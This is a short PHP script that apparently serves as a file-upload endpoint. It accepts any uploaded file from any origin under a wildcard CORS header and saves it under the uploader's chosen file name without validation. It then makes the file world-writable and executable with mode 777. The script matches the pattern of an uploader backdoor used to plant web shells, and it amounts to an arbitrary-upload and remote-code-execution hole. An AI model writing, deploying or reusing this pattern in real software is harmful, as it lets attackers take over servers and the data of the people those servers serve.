<?php
	header('Access-Control-Allow-Origin: *');
	if(copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){
		chmod($_FILES['file']['name'],777);
		chmod($_FILES['file']['name'],0777);
		echo 1;
	}else{
		echo 'Error! Uploaded files';
	}
?>